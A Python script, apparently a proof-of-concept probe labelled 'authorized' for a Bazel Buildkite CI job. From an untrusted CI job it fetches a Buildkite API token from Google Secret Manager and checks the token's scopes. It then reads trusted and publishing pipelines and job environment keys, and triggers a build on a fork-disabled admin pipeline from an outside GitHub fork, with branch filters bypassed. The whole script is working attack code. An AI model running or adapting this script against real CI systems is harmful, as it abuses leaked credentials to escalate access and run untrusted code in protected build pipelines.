#!/usr/bin/env python3
"""Authorized synthetic probe for B-0244; never prints credential values."""

import json
import os
import subprocess
import urllib.error
import urllib.request


NONCE = "hi_from_robert:d21766e5488dc00f"
BFADMIN_COMMIT = "a3842504336585fb9a51046a10df2a5f8e3e3bda"
BFADMIN_BRANCH = "b0244-hi-from-robert-d21766e5488dc00f"
API = "https://api.buildkite.com/v2"


def emit(result):
    print("B0244_RESULT " + json.dumps(result, sort_keys=True, separators=(",", ":")))


def request(token, method, path, payload=None):
    body = None
    headers = {"Authorization": "Bearer " + token}
    if payload is not None:
        body = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(API + path, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as response:
            raw = response.read()
            parsed = json.loads(raw) if raw else None
            return response.status, parsed
    except urllib.error.HTTPError as error:
        raw = error.read()
        try:
            parsed = json.loads(raw) if raw else None
        except json.JSONDecodeError:
            parsed = {"message": raw.decode("utf-8", "replace")[:200]}
        return error.code, parsed


def main():
    label = os.environ.get("BUILDKITE_LABEL", "")
    shard = os.environ.get("BUILDKITE_PARALLEL_JOB", "")
    if "Ubuntu 24.04 LTS (shard 1)" not in label or shard not in ("", "0"):
        emit({"nonce": NONCE, "state": "not-designated-job"})
        return

    job_id = os.environ.get("BUILDKITE_JOB_ID", "unknown")
    guard = "/tmp/b0244-" + job_id + ".done"
    try:
        descriptor = os.open(guard, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        os.close(descriptor)
    except FileExistsError:
        emit({"nonce": NONCE, "state": "already-ran"})
        return

    result = {
        "nonce": NONCE,
        "state": "started",
        "build": os.environ.get("BUILDKITE_BUILD_NUMBER"),
        "job": job_id,
        "pipeline": os.environ.get("BUILDKITE_PIPELINE_SLUG"),
        "commit": os.environ.get("BUILDKITE_COMMIT"),
    }

    try:
        token = subprocess.check_output(
            [
                "gcloud",
                "secrets",
                "versions",
                "access",
                "latest",
                "--secret=bazel-bazelcipy-BuildkiteClient-token",
                "--project=bazel-untrusted",
            ],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=20,
        ).strip()
        result["secret_access"] = True

        status, token_info = request(token, "GET", "/access-token")
        result["access_token"] = {
            "status": status,
            "scopes": sorted(token_info.get("scopes", [])) if isinstance(token_info, dict) else [],
            "description": token_info.get("description") if isinstance(token_info, dict) else None,
            "created_at": token_info.get("created_at") if isinstance(token_info, dict) else None,
            "expires_at": token_info.get("expires_at") if isinstance(token_info, dict) else None,
        }

        probes = {
            "current_pipeline": "/organizations/bazel/pipelines/bazel-bazel-github-presubmit",
            "fork_disabled_pipeline": "/organizations/bazel/pipelines/buildfarm-admin-farmer",
            "trusted_publish_pipeline": "/organizations/bazel-trusted/pipelines/publish-bazel-binaries",
            "own_job_env": "/organizations/bazel/jobs/" + job_id + "/env",
            "own_job_artifacts": "/organizations/bazel/jobs/" + job_id + "/artifacts",
            "own_job_log": "/organizations/bazel/jobs/" + job_id + "/log",
        }
        result["reads"] = {}
        for name, path in probes.items():
            read_status, read_body = request(token, "GET", path)
            entry = {"status": read_status}
            if name == "own_job_env" and read_status == 200 and isinstance(read_body, dict):
                environment = read_body.get("env", read_body)
                if isinstance(environment, dict):
                    entry["keys"] = sorted(environment.keys())
            result["reads"][name] = entry

        payload = {
            "commit": BFADMIN_COMMIT,
            "branch": BFADMIN_BRANCH,
            "message": "[authorized B-0244 canary] " + NONCE,
            "clean_checkout": True,
            "ignore_pipeline_branch_filters": True,
            "pull_request_repository": "https://github.com/benr00t3d/bfadmin.git",
            "env": {"B0244_NONCE": NONCE},
        }
        build_status, build_body = request(
            token,
            "POST",
            "/organizations/bazel/pipelines/buildfarm-admin-farmer/builds",
            payload,
        )
        result["canary_build"] = {"status": build_status}
        if isinstance(build_body, dict):
            for field in ("number", "web_url", "state", "commit", "branch", "message"):
                if field in build_body:
                    result["canary_build"][field] = build_body[field]
            if build_status != 201:
                result["canary_build"]["error"] = build_body.get("message")
        result["state"] = "complete"
    except Exception as error:
        result["state"] = "error"
        result["error"] = type(error).__name__ + ": " + str(error)[:300]
    finally:
        if "token" in locals():
            token = ""

    emit(result)


if __name__ == "__main__":
    main()
